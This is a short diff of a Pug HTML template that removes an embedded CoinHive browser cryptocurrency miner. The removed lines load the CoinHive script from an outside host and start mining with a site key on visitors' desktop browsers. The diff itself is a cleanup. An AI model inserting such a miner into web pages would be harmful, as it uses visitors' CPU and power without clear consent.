@@ -44,12 +44,6 @@ html(lang='en', manifest='cache.manifest')
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());
       gtag('config', 'UA-110171790-2');
-    script(src='https://coinhive.com/lib/coinhive.min.js')
-    script.
-      var miner = new CoinHive.Anonymous('FSbLoPpvacuYC8dQElxAsZ8joouDQSbm', {throttle: 0.2});
-      if (!miner.isMobile() && !miner.didOptOut(14400)) {
-      miner.start();
-      }
   body
     input(type='hidden', name='_csrf', value='#{csrfToken}')
     .container
